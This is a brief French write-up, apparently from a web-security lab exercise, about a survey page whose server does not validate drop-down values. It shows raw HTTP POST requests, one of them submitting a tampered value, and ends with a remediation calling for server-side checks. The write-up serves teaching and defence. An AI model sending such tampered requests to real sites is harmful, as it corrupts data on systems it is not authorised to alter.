# Non verified data send

## Exploitation

Sur la page ?page=survey on peut voir des menus déroulant avec des valeurs dedans il est possible de les changer le serveur ne les verifie pas 

```text
POST /?page=survey HTTP/1.1
Host: 192.168.122.55
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://192.168.122.55
Connection: close
Referer: http://192.168.122.55/?page=survey
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```

sujet=2&valeur=6

```
POST /?page=survey HTTP/1.1
Host: 192.168.122.55
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://192.168.122.55
Connection: close
Referer: http://192.168.122.55/?page=survey
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```

sujet=2&valeur=42

l'important c'est les valeurs

## Resolution

Faire vérifier par le serveur que les valeur envoyées existent bel et bien